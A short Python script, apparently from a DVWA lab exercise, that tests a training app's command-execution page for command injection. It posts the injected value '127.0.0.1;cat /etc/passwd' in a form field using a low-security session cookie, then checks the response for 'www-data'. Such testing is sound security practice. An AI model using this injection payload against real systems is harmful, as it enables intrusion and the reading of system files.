import requests
header = {"Cookie": "security=low; PHPSESSID=a0b29e43b154e8cf261c3a93686bdd94"}
url = "http://10.10.10.10/dvwa/vulnerabilities/exec/#"
data = {"ip":"127.0.0.1;cat /etc/passwd", "submit":"submit"}
sonuc = requests.post(url = url, data=data, headers=header)
if "www-data" in str(sonuc.content):
    print("Command injection vardır.")